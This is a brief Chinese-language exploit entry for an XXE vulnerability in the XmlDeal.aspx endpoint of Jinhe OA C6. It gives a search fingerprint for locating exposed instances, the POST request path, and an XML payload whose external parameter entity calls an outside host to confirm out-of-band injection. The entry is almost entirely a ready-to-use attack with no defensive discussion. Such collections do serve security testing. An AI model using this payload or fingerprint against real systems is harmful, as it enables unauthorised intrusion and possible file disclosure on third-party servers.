# 金和OA-C6-XmlDeal.aspx存在XXE漏洞

金和OA ｜ XXE ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`POST /c6/JHSoft.Web.Message/XmlDeal.aspx HTTP/1.1`

**Payload**
```
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://iohndteton.dgrh3.cn/"> %remote;]>'
```